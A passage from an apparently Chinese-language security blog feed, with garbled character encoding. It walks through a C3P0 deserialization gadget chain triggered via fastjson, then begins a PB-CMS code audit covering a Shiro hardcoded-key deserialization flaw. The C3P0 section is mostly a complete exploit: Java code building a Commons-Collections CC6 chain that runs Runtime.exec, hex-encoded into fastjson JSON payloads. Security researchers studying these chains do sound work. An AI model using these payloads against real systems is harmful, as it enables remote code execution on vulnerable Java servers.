title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™æ¡é“¾å…¥å£åœ¨<code>WrapperConnectionPoolDataSource</code>ç±»ä¸‹çš„æ¥æ”¶ä¸€ä¸ªå¸ƒå°”å€¼çš„æ„é€ å‡½æ•°ä¸Š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921953.png" alt="image-20240411192106711"><br>è·Ÿè¿›<code>parseUserOverridesAsString</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException  </span><br><span class="line">   &#123; <span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">   <span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);  </span><br><span class="line">   <span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );  </span><br><span class="line">   <span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    <span class="keyword">return</span> Collections.EMPTY_MAP;  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•é¦–å…ˆåˆ¤æ–­<code>userOverridesAsString</code>æ˜¯å¦ä¸ºç©ºï¼Œè¿™é‡Œè‚¯å®šæ˜¯èƒ½æ»¡è¶³çš„ï¼Œå› ä¸ºæ˜¯é€šè¿‡getteræ–¹æ³•è·å–çš„ï¼Œåˆ©ç”¨fastjsonå¾ˆå®¹æ˜“è°ƒç”¨ï¼Œç„¶åå°±æ˜¯å°†<code>userOverridesAsString</code>çš„<code>HASM_HEADER</code>å»æ‰è¿˜ä¼šå»æ‰æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œ<code>HASM_HEADER</code>æ˜¯ä¸€ä¸ªé»˜è®¤å€¼<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921820.png" alt="image-20240411192121764"><br>æ‰€ä»¥åºåˆ—åŒ–çš„æ—¶å€™åŠ ä¸Šå°±è¡Œï¼Œå»æ‰æœ€åä¸€ä¸ªå­—ç¬¦ç»™å®ƒéšä¾¿è¡¥ä¸ªä¸œè¥¿å³å¯ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯è¡¥ä¸ªåˆ†å·ï¼Œç„¶åæ˜¯<code>ByteUtils.fromHexAscii( hexAscii )</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„åº”è¯¥æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ï¼Œç„¶åå°±æ˜¯æœ€åä¸€å¥è¿”å›äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†å­—èŠ‚æ•°ç»„serBytesååºåˆ—åŒ–ä¸ºä¸€ä¸ªMapå¯¹è±¡ï¼Œç„¶åï¼Œä½¿ç”¨Collections.unmodifiableMap()å°†è¿™ä¸ªMapå¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸ªä¸å¯ä¿®æ”¹çš„Mapå¯¹è±¡ï¼Œè·Ÿè¿›<code>fromByteArray</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921524.png" alt="image-20240411192137372"><br>ç»§ç»­è·Ÿè¿›<code>deserializeFromByteArray</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921805.png" alt="image-20240411192149674"><br>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†readObjectæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªä¹Ÿæ˜¯ä¸€æ¡äºŒæ¬¡ååºåˆ—åŒ–é“¾</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><p>è¿™æ¡é“¾å…¶å®è·Ÿä¸‹æ¥å‘ç°å°±å¾ˆç®€å•ï¼Œä½†æ˜¯å…¶å®æ„é€ expçš„æ—¶å€™æœ‰ç‚¹è¿·ï¼Œåˆ©ç”¨fastjsonååºåˆ—åŒ–çš„ç‰¹æ€§å…¶å®ä¼šå…ˆè°ƒç”¨æ„é€ å‡½æ•°ï¼Œå…¶æ¬¡æ‰ä¼šè°ƒgetterå³<code>getUserOverridesAsString()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå…¶å®ç¬¬ä¸€æ¬¡å°±ä¸ä¼šè§¦å‘åˆ°æˆ‘ä»¬çš„å±é™©åºåˆ—åŒ–æ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œå…¶å®æ˜¯éœ€è¦è§¦å‘ä¸¤æ¬¡æ„é€ å‡½æ•°ï¼Œç¼–å†™expå…¶å®å°±æ˜¯å°†CCé“¾çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œ16è¿›åˆ¶ç¼–ç ååŠ åˆ°<code>userOverridesAsString</code>ä¸­å³å¯ï¼Œè¿™é‡Œå…ˆæ‹¿æ«å¸ˆå‚…çš„expè°ƒè¯•ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Hex</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//CC6çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨InvokeTransformeråŒ…è£…ä¸€ä¸‹</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"> </span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922795.png" alt="image-20240411192203687"><br>å¯ä»¥çœ‹åˆ°æ­¤æ—¶æˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®å¹¶æ²¡æœ‰ä¼ è¿›æ¥ï¼Œç„¶ååé¢ä¼šè°ƒç”¨åˆ°ä¸‹é¢è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922651.png" alt="image-20240411192211483"><br>è¿™ä¸ªæ–¹æ³•çš„å‚æ•°å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œè¿™é‡Œä¼šåˆ¤æ–­<code>oldVal</code>å’Œ<code>userOverridesAsString</code>æ˜¯å¦ç›¸ç­‰æˆ–è€…éƒ½ä¸ºç©ºï¼Œå¦åˆ™çš„åŒ–å°±ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„åºåˆ—åŒ–æ•°æ®èµ‹å€¼ç»™<code>userOverridesAsString</code>ï¼Œä½†æ˜¯å½“æˆ‘èµ°åˆ°æœ€åä¸€å¥çš„æ—¶å€™è®¡ç®—æœºå°±å¼¹å‡ºæ¥äº†ï¼Œæ‰€ä»¥è‚¯å®šå°±ä¸æ˜¯åœ¨æˆ‘ä»¬åŸå…ˆåˆ†æçš„é‚£é‡Œè§¦å‘çš„ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>fireVetoableChange</code>æ–¹æ³•ï¼Œä¼šæ¥åˆ°<code>vetoableChange</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922473.png" alt="image-20240411192220314"><br>ä¸‹é¢å³æ˜¯<code>parseUserOverridesAsString</code>æ–¹æ³•å’Œä¸Šé¢çš„å°±æ˜¯ä¸€æ ·çš„äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922873.png" alt="image-20240411192228566"><br>è¿™é‡Œçš„varå³æˆ‘ä»¬æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œæ˜¯åœ¨<code>setUserOverridesAsString</code>æ–¹æ³•ä¸‹å°†æˆ‘ä»¬æ¶æ„çš„åºåˆ—åŒ–æ•°æ®èµ‹å€¼ç»™varè§¦å‘äºŒæ¬¡ååºåˆ—åŒ–çš„<br>æ‰€ä»¥å…¶å®ä¸‹é¢è¿™ä¸ªpayloadä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String payload = &quot;&#123;&quot; +</span><br><span class="line">        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span><br><span class="line">        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span><br><span class="line">        &quot;&#125;&quot;;</span><br></pre></td></tr></table></figure><p>åè€Œè¿™é‡Œçš„ç¬¬ä¸€ä¸ªpayloadæ²¡å¤ªç†è§£ï¼Œé‚£é‡Œè°ƒè¯•ä¹Ÿæ˜¯èµ°çš„<code>setUserOverridesAsString</code>ï¼Œå…ˆä¸ç®¡äº†ï¼Œå› ä¸ºæœ€åæ˜¯ç”±readObjectè§£æåºåˆ—åŒ–æ•°æ®ï¼Œæ‰€ä»¥è¿™é‡ŒåŒæ ·å¯ä»¥åˆ©ç”¨overlongencoding<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922707.png" alt="image-20240411192239440"><br>å¯ä»¥çœ‹åˆ°åªéœ€è¦ç”¨JavaAgent hookä¸€ä¸‹å³å¯ä»£ç éƒ½ä¸ç”¨æ”¹ï¼Œä¸‹é¢è¿™æ˜¯åŸæœ¬çš„æ ·å­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922401.png" alt="image-20240411192248247"></p><h3 id="åˆ©ç”¨é“¾-2"><a href="#åˆ©ç”¨é“¾-2" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#è®¾ç½®userOverridesAsStringå±æ€§å€¼</span><br><span class="line">WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;</span><br><span class="line">WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</span><br><span class="line"> </span><br><span class="line">#åˆå§‹åŒ–ç±»æ—¶ååºåˆ—åŒ–åå…­è¿›åˆ¶å­—èŠ‚æµ</span><br><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;</span><br><span class="line">C3P0ImplUtils#parseUserOverridesAsString -&gt;</span><br><span class="line">SerializableUtils#fromByteArray -&gt;</span><br><span class="line">SerializableUtils#deserializeFromByteArray -&gt;</span><br><span class="line">ObjectInputStream#readObject</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸­é—´è¿˜æ˜¯æœ‰å¾ˆå¤šè¿·æƒ‘ç‚¹çš„ï¼Œä½†æ˜¯å°±å…ˆè¿™æ ·å§ï¼Œæ„Ÿè§‰ç”¨CodeQLæ‰¾åº”è¯¥ä¼šæœ‰ä¸ä¸€æ ·çš„æ„Ÿè§‰å§ï¼Œç­‰å­¦ä¼šäº†æ€ä¹ˆå†™æŸ¥è¯¢å†æ¥çœ‹çœ‹</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/uuzeray/article/details/136551969">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹C3P0â€”â€”URLClassLoaderåˆ©ç”¨-CSDNåšå®¢</a><br><a href="https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE">https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE</a><br><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a><br><a href="https://xz.aliyun.com/t/12286">https://xz.aliyun.com/t/12286</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PB-CMSä»£ç å®¡è®¡å­¦ä¹ </title>
      <link href="/2024/03/PB-CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/PB-CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¥½ä¹…æ²¡æ›´æ–°åšå®¢äº†ï¼Œæ„Ÿè§‰å­¦åˆ°åé¢ä¸æ‡‚çš„ä¸œè¥¿æ›´å¤šï¼Œé€šå¸¸å­¦ä¸€ä¸ªä¸œè¥¿ä¸ºäº†ç†è§£å®ƒå°±è¦å­¦æ›´å¤šçš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¶Šæ¥è¶Šä¸æƒ³æ›´æ–°åšå®¢äº†ã€‚ã€‚ã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>é¡¹ç›®åœ°å€ï¼š<a href="https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/">https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/</a></p><h2 id="shiroååºåˆ—åŒ–æ¼æ´"><a href="#shiroååºåˆ—åŒ–æ¼æ´" class="headerlink" title="shiroååºåˆ—åŒ–æ¼æ´"></a>shiroååºåˆ—åŒ–æ¼æ´</h2><p>ç›´æ¥æ¥çœ‹pom.xmlæ–‡ä»¶ï¼Œæœåˆ°shiro<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318901.png" alt="image-20240319131808830"><br>1.4.1ç‰ˆæœ¬ï¼Œé‡‡ç”¨çš„åŠ å¯†æ¨¡å¼è¿˜æ˜¯AES-CBCï¼Œä»1.4.2ç‰ˆæœ¬å¼€å§‹é‡‡ç”¨çš„æ˜¯AES-GCM<br>æ‰€ä»¥ç›´æ¥æ‹¿å·¥å…·ä¸€æŠŠæ¢­å³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318340.png" alt="image-20240319131819286"><br>ç„¶åå‘½ä»¤æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318307.png" alt="image-20240319131830242"><br>åœ¨è¿™é‡Œ1.4.1ç‰ˆæœ¬å…¶å®shiro550ä¸èƒ½æ‰“ï¼Œæ‰“shiro550ç‰ˆæœ¬è¦å°äº1.2.4ã€‚ä½†æ˜¯åœ¨shiroååºåˆ—åŒ–æ¼æ´ä¿®å¤çš„æ—¶å€™å¦‚æœä»…å¯¹shiroç‰ˆæœ¬å‡çº§è€Œæ²¡æœ‰é‡æ–°ç”Ÿæˆå¯†é’¥é‚£ä¹ˆAESåŠ å¯†çš„é»˜è®¤å¯†é’¥ç¡¬ç¼–ç ä»ç„¶ä¼šåœ¨ä»£ç é‡Œé¢ï¼Œå°±ä¼šåŒæ ·å­˜åœ¨ååºåˆ—åŒ–é£é™©ï¼Œè¿™é‡Œå»çœ‹çœ‹æ˜¯å¦å­˜åœ¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318699.png" alt="image-20240319131842491"><br>ç¡®å®å­˜åœ¨ï¼Œä½ç½®åœ¨<code>src/main/java/com/puboot/common/config/ShiroConfig.java</code><br>æœäº†ä¸€ä¸‹è¿™é‡Œæ€ä¹ˆç”Ÿæˆä¸€ä¸ªæ–°çš„shirokeyï¼Œå¯ä»¥åˆ©ç”¨å®˜æ–¹æä¾›çš„æ–¹æ³•ç”Ÿæˆä¸€ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.crypto.KeyGenerator;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">KeyGenerator</span> <span class="variable">keygen</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span 